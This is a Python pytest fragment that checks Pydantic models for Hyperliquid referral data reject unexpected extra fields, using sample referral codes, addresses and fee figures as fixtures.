    models_and_data: list[tuple[type[BaseModel], dict[str, Any]]] = [
        (
            HyperliquidRawReferredBy,
            {
                "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
                "code": "TESTNET",
            },
        ),
        (
            HyperliquidRawReferralState,
            {
                "cumVlm": "960652.017122",
                "cumRewardedFeesSinceReferred": "196.838825",
                "cumFeesRewardedToReferrer": "19.683748",
                "timeJoined": 1679425029416,
                "user": "0x11af2b93dcb3568b7bf2b6bd6182d260a9495728",
            },
        ),
        (
            HyperliquidRawReferrerData,
            {
                "code": "TEST",
                "referralStates": [],
            },
        ),
        (
            HyperliquidRawReferrerState,
            {
                "stage": "ready",
                "data": {
                    "code": "TEST",
                    "referralStates": [],
                },
            },
        ),
    ]

    for model_class, valid_data in models_and_data:
        data_copy = dict(valid_data)
        data_copy["extraField"] = "test"

        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            model_class.model_validate(data_copy)
